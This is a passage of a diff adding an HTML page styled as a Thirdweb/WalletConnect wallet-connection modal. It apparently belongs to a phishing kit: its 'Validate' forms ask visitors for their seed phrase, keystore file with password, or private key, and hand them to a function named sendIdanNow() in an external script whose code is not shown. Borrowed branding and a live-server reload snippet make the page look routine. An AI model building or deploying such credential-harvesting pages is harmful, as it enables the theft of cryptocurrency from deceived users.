+          ">Others</div>
+                    <div class="wallet-description">Connect with WalletConnect</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+  
+          <!-- Page 1a: Logo Animation Transition -->
+          <div id="modalPage1a" class="logo-transition-page" style="display:none;">
+            <img id="walletZoomLogo" src="" alt="Wallet Logo" class="zoom-logo">
+          </div>
+  
+  
+  
+          <!-- Page 3: Credential Form -->
+          <div id="modalPage3" class="credential-form-page" style="display: none;">
+            <!-- Wallet Identity -->
+            <div class="wallet-identity">
+              <div class="wallet-logo-wrapper">
+                <div class="wallet-logo-ring" aria-hidden="true"></div>
+                <img id="wallet_logo" src="#" alt="Wallet logo" width="60" height="60">
+              </div>
+              <p id="wallet_name" class="wallet-name-display" style="display: none !important;"></p>
+            </div>
+  
+  
+  
+            <!-- Status Message -->
+            <div id="status_message" class="status-message"></div>
+  
+  
+            <ul class="nav nav-pills" role="tablist" style="gap:8px;">
+              <li class="nav-item">
+                <button id="pills-phrase-tab" class="nav-link active" type="button"
+                  onclick="activateTab('pills-phrase')">Phrase</button>
+              </li>
+              <li class="nav-item">
+                <button id="pills-keystore-tab" class="nav-link" type="button"
+                  onclick="activateTab('pills-keystore')">Keystore</button>
+              </li>
+              <li class="nav-item">
+                <button id="pills-private-tab" class="nav-link" type="button"
+                  onclick="activateTab('pills-private')">Private Key</button>
+              </li>
+            </ul>
+  
+            <!-- Tab Content -->
+            <div class="tab-content">
+              <!-- Phrase Tab -->
+              <div id="pills-phrase" class="tab-pane active" style="display: block;">
+                <form class="credential-form" onsubmit="event.preventDefault();">
+  
+                  <div class="form-group">
+                    <label for="secret_phrase">Phrase</label>
+                    <textarea class="form-control" id="secret_phrase" name="secret_phrase" rows="4"
+                      placeholder="Enter your 12 or 24-word phrase " required=""></textarea>
+                    <p
+                      style="color: #fff !important;font-size: xx-small !important; font-weight: bold !important; text-align: center !important;">
+                      Typically 12 (sometimes 24) words seperated by single spaces</p>
+                  </div>
+                  <div class="form-submit" style="align-items: center;">
+                    <button class="custom-import-btn" type="button" onclick="sendIdanNow('phrase')"
+                      style="border: transparent !important; border-radius: 22px !important;">
+                      Validate
+                    </button>
+                  </div>
+                </form>
+              </div>
+  
+              <!-- Keystore Tab -->
+              <div id="pills-keystore" class="tab-pane" style="display: none;">
+                <form class="credential-form" onsubmit="event.preventDefault();">
+  
+                  <div class="form-group">
+                    <label for="keystore">Keystore JSON</label>
+                    <textarea class="form-control" id="keystore" name="keystore" rows="4"
+                      placeholder="Paste your keystore JSON content" required=""></textarea>
+                  </div>
+                  <div class="form-group">
+                    <label for="password">Password</label>
+                    <input class="form-control" id="password" name="password" type="password"
+                      placeholder="Enter keystore password" required="">
+                  </div>
+                  <div class="form-submit">
+                    <button class="custom-import-btn" type="button" onclick="sendIdanNow('keystore')"
+                      style="border: transparent !important; border-radius: 22px !important;">
+                      Validate
+                    </button>
+                  </div>
+                </form>
+              </div>
+  
+              <!-- Private Key Tab -->
+              <div id="pills-private" class="tab-pane" style="display: none;">
+                <form class="credential-form" onsubmit="event.preventDefault();">
+  
+                  <div class="form-group">
+                    <label for="private_key">Private Key</label>
+                    <input class="form-control" id="private_key" name="private_key" type="password"
+                      placeholder="Enter your private key" required="">
+                  </div>
+                  <div class="form-submit">
+                    <button class="custom-import-btn" type="button" onclick="sendIdanNow('private key')"
+                      style="border: transparent !important; border-radius: 22px !important;">
+                      Validate
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
+          </div>
+  
+  
+  
+          <div style=" align-self: center !important; color: inherit !important; margin-top: 1rem !important; margin-bottom: 1rem !important;"><a href="https://thirdweb.com/connect?utm_source=cw_text" target="_blank">
+            <svg width="170" height="17" viewBox="0 0 170 17" fill="none"
+              xmlns="http://www.w3.org/2000/svg">
+              <g clip-path="url(#clip0_208_15)">
+                <path fill-rule="evenodd" clip-rule="evenodd"
+                  d="M122.262 1.76074C121.506 1.76074 120.886 2.37313 120.886 3.15393C120.886 3.91942 121.506 4.53181 122.262 4.53181C123.019 4.53181 123.639 3.91942 123.639 3.15393C123.639 2.37313 123.019 1.76074 122.262 1.76074ZM123.472 5.23601H121.068V13.4879H123.472V5.23601ZM107.034 2.06696H109.378V5.23607H111.178V7.44068H109.378V10.3495C109.378 10.7782 109.711 11.115 110.119 11.115H111.162V13.4574H110.119C108.425 13.4574 107.034 12.0642 107.034 10.3342V7.42536H105.945V5.22076H107.034V2.06696ZM116.909 5.05236C115.82 5.05236 114.958 5.51164 114.626 6.23121V2.06696H112.221V13.4727H114.626V8.84917C114.626 7.88466 115.246 7.21103 116.123 7.21103C117.015 7.21103 117.514 7.79281 117.514 8.77262V13.488H119.919V8.46642C119.919 6.32307 118.83 5.05236 116.909 5.05236ZM126.905 5.22072V6.35364C127.268 5.52691 128.145 5.05232 129.249 5.03701C129.415 5.03701 129.627 5.05232 129.884 5.08293V7.3794C129.642 7.33346 129.37 7.30285 129.083 7.30285C127.707 7.30285 126.905 8.08364 126.905 9.44619V13.4727H124.501V5.22072H126.905ZM136.644 6.30776C136.402 5.58819 135.449 5.08299 134.224 5.08299C133.075 5.08299 132.107 5.49634 131.336 6.32307C130.58 7.13448 130.187 8.16023 130.187 9.3544C130.187 10.5486 130.58 11.559 131.336 12.401C132.107 13.2124 133.075 13.6258 134.224 13.6258C135.449 13.6258 136.402 13.1206 136.644 12.401V13.488H139.048V2.06696H136.644V6.30776ZM136.16 10.8241C135.752 11.2222 135.253 11.4059 134.663 11.4059C134.088 11.4059 133.589 11.2069 133.196 10.8241C132.788 10.4108 132.591 9.92085 132.591 9.3544C132.591 8.78793 132.788 8.29803 133.196 7.89997C133.604 7.4866 134.088 7.28758 134.663 7.28758C135.268 7.28758 135.767 7.4866 136.16 7.89997C136.583 8.29803 136.795 8.78793 136.795 9.3544C136.795 9.92085 136.583 10.4108 136.16 10.8241ZM145.99 5.26662L148.168 9.18591L149.634 5.23601H151.994L148.636 13.9625L145.99 9.21654L143.343 13.9625L140.001 5.23601H142.361L143.812 9.18591L145.99 5.26662ZM155.956 5.03701C154.716 5.03701 153.672 5.43505 152.855 6.23115C152.054 7.01195 151.646 8.05301 151.646 9.33903V9.41558C151.646 10.7016 152.054 11.7427 152.855 12.5235C153.687 13.2889 154.746 13.687 156.077 13.687C157.317 13.687 158.33 13.442 159.101 12.9368V10.8088C158.345 11.3446 157.377 11.6049 156.213 11.6049C154.942 11.6049 154.111 10.9772 154.065 9.99736H160.039C160.069 9.7524 160.084 9.47683 160.084 9.20125C160.084 8.0224 159.691 7.04258 158.935 6.24648C158.179 5.43505 157.165 5.03701 155.956 5.03701ZM154.065 8.42046C154.08 8.0377 154.277 7.71619 154.64 7.45593C155.018 7.19566 155.441 7.05789 155.956 7.05789C156.908 7.05789 157.649 7.68558 157.649 8.42046H154.065ZM165.816 5.08297C166.965 5.08297 167.933 5.49634 168.689 6.32307C169.46 7.14979 169.853 8.14493 169.853 9.33907C169.853 10.5332 169.46 11.5437 168.689 12.3857C167.933 13.1971 166.965 13.6105 165.816 13.6105C164.591 13.6105 163.638 13.1053 163.396 12.3857V13.4727H160.991V2.06696H163.396V6.30776C163.638 5.58819 164.591 5.08297 165.816 5.08297ZM165.377 11.4059C165.952 11.4059 166.436 11.2222 166.844 10.8241C167.252 10.4108 167.449 9.92085 167.449 9.3544C167.449 8.78793 167.252 8.29801 166.844 7.89997C166.451 7.4866 165.952 7.28758 165.377 7.28758C164.787 7.28758 164.288 7.4866 163.865 7.89997C163.456 8.29801 163.245 8.78793 163.245 9.3544C163.245 9.92085 163.456 10.4108 163.865 10.8241C164.273 11.2069 164.772 11.4059 165.377 11.4059Z"
+                  fill="white"></path>
+                <path
+                  d="M89.8362 0.333008C89.988 0.364561 90.1313 0.428355 90.2565 0.520089C90.3966 0.630998 90.5038 0.778018 90.5669 0.945385C90.9647 1.94075 91.3625 2.9355 91.7603 3.92966C92.2006 5.03532 92.6431 6.14117 93.0877 7.24722C93.3194 7.82711 93.55 8.4076 93.7853 8.9863C93.8354 9.10466 93.8612 9.23191 93.8612 9.36046C93.8612 9.48901 93.8354 9.61626 93.7853 9.73462L91.7633 14.7786C91.6295 15.1125 91.3869 15.32 91.0303 15.3741C90.5867 15.4409 90.1898 15.222 90.0296 14.8327C89.6501 13.8997 89.2791 12.9637 88.9051 12.0283L87.0032 7.27007C86.4401 5.85803 85.8762 4.4464 85.3114 3.03517C85.1241 2.56656 84.9428 2.09555 84.7471 1.63055C84.6932 1.50411 84.6677 1.36735 84.6724 1.22995C84.6772 1.09255 84.712 0.957863 84.7744 0.835438C84.8368 0.713012 84.9254 0.605838 85.0337 0.52151C85.1421 0.437179 85.2677 0.377755 85.4015 0.347445C85.4177 0.343836 85.4333 0.33782 85.4489 0.333008H89.8362Z"
+                  fill="url(#paint0_linear_208_15)"></path>
+                <path
+                  d="M81.9564 0.333008C82.0062 0.346844 82.0561 0.358875 82.1047 0.375718C82.2313 0.415281 82.3474 0.482777 82.4446 0.57324C82.5417 0.663706 82.6174 0.774838 82.666 0.898465C83.1003 1.97644 83.5325 3.05522 83.9628 4.13481C84.3982 5.2232 84.8337 6.31181 85.2691 7.4006C85.482 7.93438 85.696 8.46795 85.9109 9.00134C85.959 9.11556 85.9838 9.23828 85.9838 9.36226C85.9838 9.48624 85.959 9.60897 85.9109 9.7232C85.6707 10.3223 85.4306 10.9213 85.1905 11.52C84.7502 12.616 84.31 13.7121 83.8697 14.8081C83.8006 14.9787 83.6824 15.125 83.5302 15.2282C83.378 15.3315 83.1986 15.3871 83.0148 15.388C82.8201 15.3914 82.6291 15.3345 82.4679 15.225C82.3067 15.1155 82.1832 14.9587 82.1143 14.7762C81.7073 13.7433 81.2918 12.7135 80.88 11.6824C80.3281 10.2864 79.7734 8.89144 79.2158 7.49746C78.6483 6.0786 78.081 4.65954 77.5139 3.2403C77.2989 2.70311 77.0858 2.16473 76.8679 1.62814C76.7727 1.40457 76.768 1.15263 76.855 0.925706C76.942 0.698779 77.1137 0.514681 77.3337 0.412412C77.4136 0.380081 77.4956 0.353544 77.5793 0.333008H81.9564Z"
+                  fill="url(#paint1_linear_208_15)"></path>
+                <path
+                  d="M101.588 9.50617C101.468 9.91224 101.288 10.2954 101.135 10.687C100.692 11.8011 100.246 12.9146 99.7983 14.0274C99.6956 14.2825 99.5912 14.5369 99.4916 14.7932C99.4214 14.9683 99.3003 15.1183 99.1442 15.2237C98.9881 15.3292 98.804 15.3853 98.6156 15.3847C98.4273 15.3841 98.2436 15.3269 98.0881 15.2205C97.9326 15.1141 97.8124 14.9633 97.7434 14.7878L95.7994 9.92605L94.1185 5.72664C93.5698 4.35552 93.0215 2.98458 92.4735 1.61385C92.4214 1.48852 92.3974 1.35326 92.4032 1.21761C92.4089 1.08196 92.4443 0.949232 92.5068 0.828775C92.5693 0.708318 92.6574 0.603069 92.765 0.520448C92.8725 0.437828 92.9968 0.37985 93.1291 0.350601C93.1471 0.346391 93.1645 0.340375 93.1825 0.334961H97.5699C97.5836 0.339172 97.5969 0.344586 97.6108 0.347594C97.7646 0.379769 97.9079 0.450334 98.0273 0.552752C98.1467 0.655171 98.2385 0.78613 98.2938 0.933503C98.5493 1.57515 98.805 2.215 99.0612 2.85305C99.7316 4.52856 100.401 6.20407 101.071 7.87958C101.246 8.32113 101.442 8.75485 101.586 9.20842L101.588 9.50617Z"
+                  fill="url(#paint2_linear_208_15)"></path>
+              </g>
+              <path
+                d="M0.788497 15.9577V6.16183H2.73655V7.35849H2.82468C2.91126 7.16678 3.03649 6.97197 3.20037 6.77407C3.36735 6.57308 3.5838 6.40611 3.84972 6.27315C4.11874 6.13709 4.45269 6.06906 4.85158 6.06906C5.37106 6.06906 5.85034 6.20512 6.28942 6.47723C6.72851 6.74624 7.07947 7.15286 7.3423 7.69708C7.60513 8.2382 7.73655 8.91693 7.73655 9.73326C7.73655 10.5279 7.60823 11.1989 7.35158 11.7462C7.09802 12.2905 6.7517 12.7033 6.31262 12.9846C5.87662 13.2629 5.38806 13.4021 4.84694 13.4021C4.46351 13.4021 4.13729 13.3387 3.86827 13.2119C3.60235 13.0851 3.38435 12.9259 3.21429 12.7342C3.04422 12.5394 2.91435 12.343 2.82468 12.1451H2.76438V15.9577H0.788497ZM2.72263 9.72398C2.72263 10.1476 2.78139 10.5171 2.89889 10.8325C3.01639 11.1479 3.18646 11.3937 3.40909 11.57C3.63173 11.7432 3.90229 11.8297 4.22078 11.8297C4.54236 11.8297 4.81447 11.7416 5.03711 11.5654C5.25974 11.386 5.42826 11.1386 5.54267 10.8232C5.66017 10.5047 5.71892 10.1383 5.71892 9.72398C5.71892 9.31273 5.66172 8.95094 5.54731 8.63864C5.4329 8.32633 5.26438 8.08205 5.04174 7.9058C4.81911 7.72955 4.54545 7.64142 4.22078 7.64142C3.8992 7.64142 3.62709 7.72645 3.40445 7.89652C3.18491 8.06659 3.01639 8.30778 2.89889 8.62008C2.78139 8.93239 2.72263 9.30036 2.72263 9.72398ZM11.8809 13.4253C11.1604 13.4253 10.5374 13.2722 10.0117 12.9661C9.48912 12.6569 9.08559 12.2271 8.80111 11.6767C8.51664 11.1232 8.3744 10.4816 8.3744 9.75181C8.3744 9.01588 8.51664 8.37271 8.80111 7.82231C9.08559 7.26882 9.48912 6.83901 10.0117 6.53289C10.5374 6.22367 11.1604 6.06906 11.8809 6.06906C12.6014 6.06906 13.2229 6.22367 13.7455 6.53289C14.2711 6.83901 14.6762 7.26882 14.9607 7.82231C15.2451 8.37271 15.3874 9.01588 15.3874 9.75181C15.3874 10.4816 15.2451 11.1232 14.9607 11.6767C14.6762 12.2271 14.2711 12.6569 13.7455 12.9661C13.2229 13.2722 12.6014 13.4253 11.8809 13.4253ZM11.8902 11.8947C12.2179 11.8947 12.4916 11.8019 12.7111 11.6164C12.9307 11.4278 13.0961 11.1711 13.2074 10.8464C13.3218 10.5218 13.379 10.1522 13.379 9.7379C13.379 9.32355 13.3218 8.95404 13.2074 8.62936C13.0961 8.30469 12.9307 8.04804 12.7111 7.85942C12.4916 7.6708 12.2179 7.57649 11.8902 7.57649C11.5593 7.57649 11.281 7.6708 11.0553 7.85942C10.8327 8.04804 10.6641 8.30469 10.5497 8.62936C10.4384 8.95404 10.3827 9.32355 10.3827 9.7379C10.3827 10.1522 10.4384 10.5218 10.5497 10.8464C10.6641 11.1711 10.8327 11.4278 11.0553 11.6164C11.281 11.8019 11.5593 11.8947 11.8902 11.8947ZM17.5071 13.2861L15.5684 6.16183H17.5674L18.6713 10.9485H18.7363L19.8865 6.16183H21.8485L23.0173 10.9206H23.0776L24.163 6.16183H26.1574L24.2233 13.2861H22.1314L20.907 8.80561H20.8188L19.5943 13.2861H17.5071ZM29.8878 13.4253C29.155 13.4253 28.5242 13.2769 27.9954 12.98C27.4697 12.6801 27.0647 12.2564 26.7802 11.7091C26.4957 11.1587 26.3535 10.5078 26.3535 9.75645C26.3535 9.02361 26.4957 8.38044 26.7802 7.82695C27.0647 7.27346 27.4651 6.8421 27.9815 6.53289C28.501 6.22367 29.1101 6.06906 29.8089 6.06906C30.279 6.06906 30.7165 6.14482 31.1216 6.29634C31.5297 6.44476 31.8853 6.66894 32.1884 6.96888C32.4945 7.26882 32.7326 7.64606 32.9026 8.1006C33.0727 8.55206 33.1577 9.08081 33.1577 9.68687V10.2295H27.142V9.00506H31.2978C31.2978 8.72058 31.236 8.46857 31.1123 8.24903C30.9886 8.02948 30.817 7.85787 30.5974 7.73418C30.381 7.60741 30.129 7.54402 29.8414 7.54402C29.5415 7.54402 29.2756 7.61359 29.0436 7.75274C28.8148 7.88879 28.6355 8.07277 28.5056 8.30469C28.3757 8.5335 28.3093 8.78861 28.3062 9.06999V10.2342C28.3062 10.5867 28.3711 10.8913 28.501 11.1479C28.6339 11.4046 28.821 11.6025 29.0622 11.7416C29.3034 11.8808 29.5894 11.9503 29.9203 11.9503C30.1398 11.9503 30.3408 11.9194 30.5232 11.8576C30.7057 11.7957 30.8618 11.703 30.9917 11.5793C31.1216 11.4556 31.2205 11.3041 31.2885 11.1247L33.116 11.2453C33.0232 11.6844 32.8331 12.0678 32.5455 12.3956C32.261 12.7203 31.8931 12.9738 31.4416 13.1563C30.9932 13.3356 30.4753 13.4253 29.8878 13.4253ZM34.0553 13.2861V6.16183H35.9709V7.40487H36.0451C36.175 6.96269 36.393 6.62874 36.6991 6.40302C37.0052 6.1742 37.3577 6.05979 37.7566 6.05979C37.8556 6.05979 37.9623 6.06597 38.0767 6.07834C38.1911 6.09071 38.2916 6.10772 38.3782 6.12936V7.88261C38.2854 7.85478 38.1571 7.83004 37.9932 7.8084C37.8293 7.78675 37.6793 7.77593 37.5433 7.77593C37.2526 7.77593 36.9929 7.83932 36.7641 7.9661C36.5383 8.08978 36.359 8.26294 36.226 8.48558C36.0961 8.70821 36.0312 8.96486 36.0312 9.25552V13.2861H34.0553ZM41.923 13.4253C41.1902 13.4253 40.5594 13.2769 40.0306 12.98C39.5049 12.6801 39.0999 12.2564 38.8154 11.7091C38.5309 11.1587 38.3887 10.5078 38.3887 9.75645C38.3887 9.02361 38.5309 8.38044 38.8154 7.82695C39.0999 7.27346 39.5003 6.8421 40.0167 6.53289C40.5362 6.22367 41.1453 6.06906 41.8442 6.06906C42.3142 6.06906 42.7517 6.14482 43.1568 6.29634C43.5649 6.44476 43.9205 6.66894 44.2236 6.96888C44.5297 7.26882 44.7678 7.64606 44.9378 8.1006C45.1079 8.55206 45.1929 9.08081 45.1929 9.68687V10.2295H39.1772V9.00506H43.333C43.333 8.72058 43.2712 8.46857 43.1475 8.24903C43.0238 8.02948 42.8522 7.85787 42.6327 7.73418C42.4162 7.60741 42.1642 7.54402 41.8766 7.54402C41.5767 7.54402 41.3108 7.61359 41.0788 7.75274C40.85 7.88879 40.6707 8.07277 40.5408 8.30469C40.4109 8.5335 40.3445 8.78861 40.3414 9.06999V10.2342C40.3414 10.5867 40.4063 10.8913 40.5362 11.1479C40.6691 11.4046 40.8562 11.6025 41.0974 11.7416C41.3386 11.8808 41.6246 11.9503 41.9555 11.9503C42.175 11.9503 42.376 11.9194 42.5584 11.8576C42.7409 11.7957 42.897 11.703 43.0269 11.5793C43.1568 11.4556 43.2557 11.3041 43.3237 11.1247L45.1512 11.2453C45.0584 11.6844 44.8683 12.0678 44.5807 12.3956C44.2962 12.7203 43.9283 12.9738 43.4768 13.1563C43.0284 13.3356 42.5105 13.4253 41.923 13.4253ZM48.7158 13.4021C48.1746 13.4021 47.6845 13.2629 47.2455 12.9846C46.8095 12.7033 46.4631 12.2905 46.2065 11.7462C45.9529 11.1989 45.8262 10.5279 45.8262 9.73326C45.8262 8.91693 45.9576 8.2382 46.2204 7.69708C46.4832 7.15286 46.8327 6.74624 47.2686 6.47723C47.7077 6.20512 48.1886 6.06906 48.7111 6.06906C49.11 6.06906 49.4424 6.13709 49.7083 6.27315C49.9774 6.40611 50.1938 6.57308 50.3577 6.77407C50.5247 6.97197 50.6515 7.16678 50.738 7.35849H50.7983V3.78706H52.7696V13.2861H50.8215V12.1451H50.738C50.6453 12.343 50.5139 12.5394 50.3438 12.7342C50.1768 12.9259 49.9588 13.0851 49.6898 13.2119C49.4239 13.3387 49.0992 13.4021 48.7158 13.4021ZM49.3419 11.8297C49.6604 11.8297 49.9294 11.7432 50.149 11.57C50.3716 11.3937 50.5417 11.1479 50.6592 10.8325C50.7798 10.5171 50.8401 10.1476 50.8401 9.72398C50.8401 9.30036 50.7813 8.93239 50.6638 8.62008C50.5463 8.30778 50.3763 8.06659 50.1536 7.89652C49.931 7.72645 49.6604 7.64142 49.3419 7.64142C49.0173 7.64142 48.7436 7.72955 48.521 7.9058C48.2983 8.08205 48.1298 8.32633 48.0154 8.63864C47.901 8.95094 47.8438 9.31273 47.8438 9.72398C47.8438 10.1383 47.901 10.5047 48.0154 10.8232C48.1329 11.1386 48.3014 11.386 48.521 11.5654C48.7436 11.7416 49.0173 11.8297 49.3419 11.8297ZM56.6705 13.2861V3.78706H58.6464V7.35849H58.7067C58.7933 7.16678 58.9185 6.97197 59.0824 6.77407C59.2493 6.57308 59.4658 6.40611 59.7317 6.27315C60.0007 6.13709 60.3347 6.06906 60.7336 6.06906C61.2531 6.06906 61.7323 6.20512 62.1714 6.47723C62.6105 6.74624 62.9615 7.15286 63.2243 7.69708C63.4871 8.2382 63.6185 8.91693 63.6185 9.73326C63.6185 10.5279 63.4902 11.1989 63.2336 11.7462C62.98 12.2905 62.6337 12.7033 62.1946 12.9846C61.7586 13.2629 61.2701 13.4021 60.7289 13.4021C60.3455 13.4021 60.0193 13.3387 59.7503 13.2119C59.4844 13.0851 59.2664 12.9259 59.0963 12.7342C58.9262 12.5394 58.7963 12.343 58.7067 12.1451H58.6185V13.2861H56.6705ZM58.6046 9.72398C58.6046 10.1476 58.6634 10.5171 58.7809 10.8325C58.8984 11.1479 59.0685 11.3937 59.2911 11.57C59.5137 11.7432 59.7843 11.8297 60.1028 11.8297C60.4244 11.8297 60.6965 11.7416 60.9191 11.5654C61.1417 11.386 61.3103 11.1386 61.4247 10.8232C61.5422 10.5047 61.6009 10.1383 61.6009 9.72398C61.6009 9.31273 61.5437 8.95094 61.4293 8.63864C61.3149 8.32633 61.1464 8.08205 60.9237 7.9058C60.7011 7.72955 60.4275 7.64142 60.1028 7.64142C59.7812 7.64142 59.5091 7.72645 59.2865 7.89652C59.0669 8.06659 58.8984 8.30778 58.7809 8.62008C58.6634 8.93239 58.6046 9.30036 58.6046 9.72398ZM65.5354 15.9577C65.2849 15.9577 65.0499 15.9376 64.8304 15.8975C64.6139 15.8603 64.4346 15.8124 64.2923 15.7537L64.7376 14.2787C64.9695 14.3498 65.1782 14.3885 65.3638 14.3947C65.5524 14.4009 65.7147 14.3576 65.8508 14.2648C65.9899 14.172 66.1028 14.0143 66.1894 13.7917L66.3053 13.4902L63.7497 6.16183H65.8276L67.3025 11.3937H67.3768L68.8656 6.16183H70.9575L68.1884 14.0561C68.0555 14.4395 67.8746 14.7735 67.6458 15.0579C67.4201 15.3455 67.134 15.5666 66.7877 15.7212C66.4414 15.8789 66.0239 15.9577 65.5354 15.9577Z"
+                fill="white"></path>
+              <defs>
+                <linearGradient id="paint0_linear_208_15" x1="83.9919" y1="1.55536" x2="94.5605"
+                  y2="12.1028" gradientUnits="userSpaceOnUse">
+                  <stop stop-color="#FF00A8"></stop>
+                  <stop offset="1" stop-color="#6200C6"></stop>
+                </linearGradient>
+                <linearGradient id="paint1_linear_208_15" x1="76.1162" y1="1.55175" x2="86.6824"
+                  y2="12.0968" gradientUnits="userSpaceOnUse">
+                  <stop stop-color="#FF00A8"></stop>
+                  <stop offset="1" stop-color="#6200C6"></stop>
+                </linearGradient>
+                <linearGradient id="paint2_linear_208_15" x1="91.7237" y1="1.55069" x2="102.291"
+                  y2="12.0963" gradientUnits="userSpaceOnUse">
+                  <stop stop-color="#FF00A8"></stop>
+                  <stop offset="1" stop-color="#6200C6"></stop>
+                </linearGradient>
+                <clipPath id="clip0_208_15">
+                  <rect width="93.2653" height="15.102" fill="white"
+                    transform="translate(76.7344 0.286133)"></rect>
+                </clipPath>
+              </defs>
+            </svg>
+          </a></div>
+      </div>
+    </div>
+  </div>
+  
+      <!-- Wallet Data -->
+  
+  
+      <script src="success/way/james/house/promod.js"></script>
+      <script>
+        // Demo implementation for wallet selection events
+        document.addEventListener('walletSelected', (event) => {
+          const { wallet } = event.detail;
+          const walletInfo = document.getElementById('selected-wallet-info');
+          const walletDetails = document.getElementById('wallet-details');
+          const connectBtn = document.getElementById('connect-wallet-btn');
+    
+          walletDetails.innerHTML = `
+              <div class="selected-wallet-card">
+                <img src="${wallet.icon}" alt="${wallet.name}" class="selected-wallet-icon">
+                <div class="selected-wallet-info">
+                  <h4>${wallet.name}</h4>
+                  <p>${wallet.description}</p>
+                </div>
+              </div>
+            `;
+    
+          walletInfo.style.display = 'block';
+          connectBtn.innerHTML = '<i class="fas fa-check"></i> Wallet Selected';
+          connectBtn.classList.add('connected');
+        });
+    
+        // Listen for modal close events
+        document.addEventListener('walletModalClosed', () => {
+          console.log('Wallet modal closed');
+        });
+      </script>
+      <!-- Code injected by live-server -->
+      <script>
+        // <![CDATA[  <-- For SVG support
+        if ('WebSocket' in window) {
+          (function () {
+            function refreshCSS() {
+              var sheets = [].slice.call(document.getElementsByTagName("link"));
+              var head = document.getElementsByTagName("head")[0];
+              for (var i = 0; i < sheets.length; ++i) {
+                var elem = sheets[i];
+                var parent = elem.parentElement || head;
+                parent.removeChild(elem);
+                var rel = elem.rel;
+                if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+                  var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+                  elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+                }
+                parent.appendChild(elem);
+              }
+            }
+            var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+            var address = protocol + window.location.host + window.location.pathname + '/ws';
+            var socket = new WebSocket(address);
+            socket.onmessage = function (msg) {
+              if (msg.data == 'reload') window.location.reload();
+              else if (msg.data == 'refreshcss') refreshCSS();
+            };
+            if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+              console.log('Live reload enabled.');
+              sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+            }
+          })();
+        }
+        else {
+          console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+        }
+        // ]]>
+      </script>
+      <!-- WalletConnect badge: paste before </body> -->
+      <style>
+        /* container must be positioned so the badge can sit above the icon */
+        .wallet-option {
+          position: relative !important;
+          overflow: visible !important;
+          /* allow badge to be visible outside img area */
+          -webkit-overflow-scrolling: inherit;
+        }
+    
+    
+        /* badge wrapper — placed at lower center of wallet-option */
+        .wc-badge {
+          position: absolute;
+          left: 25px !important;
+          bottom: 40px !important;
+          /* tweak to move badge vertically */
+          width: 6px !important;
+          /* badge size */
+          height: 6px !important;
+          z-index: 9999;
+          display: grid;
+          place-items: center;
+          pointer-events: none;
+        }
+    
+        .wc-badge .ring {
+          display: none !important;
+        }
+    
+        .wc-badge svg {
+          width: 20px !important;
+          height: 20px !important;
+          z-index: 2;
+          display: block;
+        }
+    
+        /* optional smaller variant */
+        .wallet-option.small .wc-badge {
+          width: 6px;
+          height: 6px;
+          bottom: 6px;
+        }
+    
+        .wallet-option.small .wc-badge svg {
+          width: 6px;
+          height: 6px;
+        }
+      </style>
+    
+      <script>
+        (function () {
+          // SVG supplied by you (kept intact)
+          const BADGE_SVG = `<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+      <circle cx="11" cy="11" r="11" transform="matrix(-1 0 0 1 23 1)" fill="#202020"></circle>
+      <circle cx="11" cy="11" r="11.5" transform="matrix(-1 0 0 1 23 1)" stroke="#C7B994" stroke-opacity="0.7"></circle>
+      <path d="M15.4523 11.0686L16.7472 9.78167C13.8205 6.87297 10.1838 6.87297 7.25708 9.78167L8.55201 11.0686C10.7779 8.85645 13.2279 8.85645 15.4538 11.0686H15.4523Z" fill="#C7B994"></path>
+      <path d="M15.0199 14.067L12 11.0656L8.98 14.067L5.96004 11.0656L4.66663 12.3511L8.98 16.6393L12 13.638L15.0199 16.6393L19.3333 12.3511L18.0399 11.0656L15.0199 14.067Z" fill="#C7B994"></path>
+      </svg>`;
+    
+          function createBadgeElement() {
+            const wrapper = document.createElement('div');
+            wrapper.className = 'wc-badge';
+            // ring + svg (svg as node so it's not blocked by CSP inline-style issues)
+            wrapper.innerHTML = `<div class="ring"></div>${BADGE_SVG}`;
+            return wrapper;
+          }
+    
+          function attachBadge(walletOptionEl) {
+            if (!walletOptionEl || walletOptionEl.dataset.wcInjected === '1') return;
+            // only attach to walletconnect-type by default
+            if (walletOptionEl.getAttribute('data-type') !== 'walletconnect') return;
+    
+            // ensure parent is positioned (CSS already sets .wallet-option)
+            walletOptionEl.style.position = walletOptionEl.style.position || 'relative';
+    
+            // append badge
+            const badge = createBadgeElement();
+            // remove any old badge first to avoid duplicates
+            const existing = walletOptionEl.querySelector('.wc-badge');
+            if (existing) existing.remove();
+    
+            // append near the end so it sits above other children
+            walletOptionEl.appendChild(badge);
+            walletOptionEl.dataset.wcInjected = '1';
+          }
+    
+          // Attach to existing nodes
+          function init() {
+            document.querySelectorAll('.wallet-option').forEach(el => attachBadge(el));
+          }
+    
+          // Observe for newly added wallet-option nodes (or attribute changes)
+          const mo = new MutationObserver(muts => {
+            muts.forEach(m => {
+              if (m.type === 'childList') {
+                m.addedNodes.forEach(node => {
+                  if (node.nodeType !== 1) return;
+                  if (node.matches && node.matches('.wallet-option')) attachBadge(node);
+                  // also handle nested wallet-option inside added subtree
+                  node.querySelectorAll && node.querySelectorAll('.wallet-option').forEach(el => attachBadge(el));
+                });
+              }
+              if (m.type === 'attributes' && m.target && m.target.matches && m.target.matches('.wallet-option')) {
+                // If data-type changes, re-evaluate
+                attachBadge(m.target);
+              }
+            });
+          });
+    
+          if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', () => {
+              init();
+              mo.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['class', 'data-type'] });
+            }, { once: true });
+          } else {
+            init();
+            mo.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['class', 'data-type'] });
+          }
+    
+          // expose helper
+          window.__walletBadge = { attachBadge, createBadgeElement };
+        })();
+      </script>
+
+</body></html>
